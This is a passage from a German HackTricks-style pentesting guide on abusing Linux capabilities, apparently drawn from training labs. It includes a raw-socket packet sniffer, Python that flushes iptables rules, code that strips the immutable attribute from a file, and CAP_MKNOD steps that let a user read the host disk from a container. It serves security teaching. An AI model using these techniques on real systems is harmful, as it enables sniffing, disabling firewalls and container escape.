s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

Die [**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)-capability verleiht ihrem Träger die Möglichkeit, **Netzwerkkonfigurationen zu ändern**, einschließlich Firewall-Einstellungen, Routing-Tabellen, Socket-Berechtigungen und Netzwerkschnittstelleneinstellungen innerhalb der freigegebenen network namespaces. Sie ermöglicht außerdem das Aktivieren des **promiscuous mode** auf Netzwerkschnittstellen, wodurch packet sniffing über mehrere namespaces hinweg möglich wird.

**Beispiel mit einer Binärdatei**

Angenommen, die **python-Binärdatei** verfügt über diese capabilities.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Das bedeutet, dass es möglich ist, Inode-Attribute zu ändern.** Mit dieser Capability kannst du Privilegien nicht direkt eskalieren.

**Beispiel mit einer Binary**

Wenn du feststellst, dass eine Datei unveränderlich ist und Python über diese Capability verfügt, kannst du **das unveränderlich-Attribut entfernen und die Datei bearbeitbar machen:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Beachte, dass dieses unveränderliche Attribut normalerweise mit folgenden Befehlen gesetzt und entfernt wird:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht die Ausführung des Systemaufrufs `chroot(2)`, wodurch möglicherweise das Entkommen aus `chroot(2)`-Umgebungen über bekannte Schwachstellen möglich wird:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht nicht nur die Ausführung des Systemaufrufs `reboot(2)` zum Neustarten des Systems, einschließlich spezifischer Befehle wie `LINUX_REBOOT_CMD_RESTART2`, die für bestimmte Hardwareplattformen angepasst sind, sondern auch die Verwendung von `kexec_load(2)` und ab Linux 3.17 von `kexec_file_load(2)` zum Laden neuer beziehungsweise signierter Crash-Kernel.

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) wurde in Linux 2.6.37 von der umfassenderen Fähigkeit **CAP_SYS_ADMIN** getrennt und gewährt speziell die Möglichkeit, den Aufruf `syslog(2)` zu verwenden. Diese Fähigkeit ermöglicht die Anzeige von Kernel-Adressen über `/proc` und ähnliche Schnittstellen, wenn die Einstellung `kptr_restrict` auf 1 gesetzt ist; diese Einstellung kontrolliert die Offenlegung von Kernel-Adressen. Seit Linux 2.6.39 ist der Standardwert für `kptr_restrict` 0, wodurch Kernel-Adressen offengelegt werden. Viele Distributionen setzen den Wert aus Sicherheitsgründen jedoch auf 1 (Adressen nur vor Benutzern außer uid 0 verbergen) oder 2 (Adressen immer verbergen).

Zusätzlich erlaubt **CAP_SYSLOG** den Zugriff auf die `dmesg`-Ausgabe, wenn `dmesg_restrict` auf 1 gesetzt ist. Trotz dieser Änderungen kann **CAP_SYS_ADMIN** aufgrund historischer Gegebenheiten weiterhin `syslog`-Operationen ausführen.

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) erweitert die Funktionalität des Systemaufrufs `mknod` über das Erstellen regulärer Dateien, FIFOs (Named Pipes) oder UNIX-Domain-Sockets hinaus. Sie ermöglicht insbesondere das Erstellen spezieller Dateien, darunter:

- **S_IFCHR**: Zeichenorientierte Gerätedateien, beispielsweise Terminals.
- **S_IFBLK**: Blockorientierte Gerätedateien, beispielsweise Festplatten.

Diese Fähigkeit ist für Prozesse erforderlich, die Gerätedateien erstellen müssen, und ermöglicht die direkte Interaktion mit Hardware über zeichen- oder blockorientierte Geräte.

Sie ist eine standardmäßige docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Diese Fähigkeit ermöglicht privilege escalations (durch vollständiges Lesen der Festplatte) auf dem Host, wenn die folgenden Bedingungen erfüllt sind:

1. Erster Zugriff auf den Host (Unprivileged).
2. Erster Zugriff auf den Container (Privileged (EUID 0) und effektive `CAP_MKNOD`).
3. Host und Container müssen denselben User Namespace verwenden.

**Schritte zum Erstellen und Zugreifen auf ein Blockgerät in einem Container:**

1. **Auf dem Host als Standardbenutzer:**

- Ermittle deine aktuelle Benutzer-ID mit `id`, z. B. `uid=1000(standarduser)`.
- Identifiziere das Zielgerät, beispielsweise `/dev/sdb`.

2. **Im Container als `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Zurück auf dem Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Dieser Ansatz ermöglicht es dem Standardbenutzer, über den Container auf Daten von `/dev/sdb` zuzugreifen und diese potenziell zu lesen, indem gemeinsam genutzte User-Namespaces und auf dem Gerät festgelegte Berechtigungen ausgenutzt werden.

### CAP_SETPCAP

**CAP_SETPCAP** ermöglicht es einem Prozess, die **Capability-Sets** eines anderen Prozesses zu **ändern**, wodurch Capabilities zu den effektiven, vererbbaren und erlaubten Sets hinzugefügt oder daraus entfernt werden können. Ein Prozess kann jedoch nur Capabilities ändern, die er selbst in seinem erlaubten Set besitzt. Dadurch wird verhindert, dass er die Berechtigungen eines anderen Prozesses über seine eigenen hinaus erhöht. Aktuelle Kernel-Updates haben diese Regeln verschärft und `CAP_SETPCAP` darauf beschränkt, nur die Capabilities in den erlaubten Sets des eigenen Prozesses oder seiner Nachkommen zu verringern, um Sicherheitsrisiken zu minimieren. Für die Verwendung muss `CAP_SETPCAP` im effektiven Set und die Ziel-Capabilities im erlaubten Set vorhanden sein; Änderungen werden mit `capset()` vorgenommen. Dies fasst die Kernfunktion und Einschränkungen von `CAP_SETPCAP` zusammen und verdeutlicht seine Rolle bei der Rechteverwaltung und der Verbesserung der Sicherheit.

**`CAP_SETPCAP`** ist eine Linux-Capability, die es einem Prozess ermöglicht, die **Capability-Sets eines anderen Prozesses zu ändern**. Sie erlaubt es, Capabilities zu den effektiven, vererbbaren und erlaubten Capability-Sets anderer Prozesse hinzuzufügen oder daraus zu entfernen. Es gibt jedoch bestimmte Einschränkungen bei der Verwendung dieser Capability.

Ein Prozess mit `CAP_SETPCAP` **kann nur Capabilities gewähren oder entfernen, die in seinem eigenen erlaubten Capability-Set enthalten sind**. Ein Prozess kann einer anderen Prozess also keine Capability gewähren, die er selbst nicht besitzt. Diese Einschränkung verhindert, dass ein Prozess die Berechtigungen eines anderen Prozesses über sein eigenes Berechtigungsniveau hinaus erhöht.

Außerdem wurde die `CAP_SETPCAP`-Capability in aktuellen Kernel-Versionen **weiter eingeschränkt**. Sie erlaubt es einem Prozess nicht mehr, die Capability-Sets anderer Prozesse beliebig zu ändern. Stattdessen **kann ein Prozess damit nur die Capabilities in seinem eigenen erlaubten Capability-Set oder im erlaubten Capability-Set seiner Nachkommen verringern**. Diese Änderung wurde eingeführt, um potenzielle Sicherheitsrisiken im Zusammenhang mit dieser Capability zu reduzieren.

Um `CAP_SETPCAP` effektiv zu verwenden, muss die Capability im effektiven Capability-Set und die Ziel-Capabilities im erlaubten Capability-Set vorhanden sein. Anschließend kann der Systemaufruf `capset()` verwendet werden, um die Capability-Sets anderer Prozesse zu ändern.

Zusammenfassend ermöglicht `CAP_SETPCAP` einem Prozess, die Capability-Sets anderer Prozesse zu ändern, kann aber keine Capabilities gewähren, die er nicht selbst besitzt. Aufgrund von Sicherheitsbedenken wurde die Funktionalität in aktuellen Kernel-Versionen außerdem darauf beschränkt, nur Capabilities im eigenen erlaubten Capability-Set oder in den erlaubten Capability-Sets der Nachkommen zu verringern.

## Referenzen

**Die meisten dieser Beispiele stammen aus einigen Labs von** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com). Wenn du diese privesc-Techniken üben möchtest, empfehle ich diese Labs.

**Weitere Referenzen**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
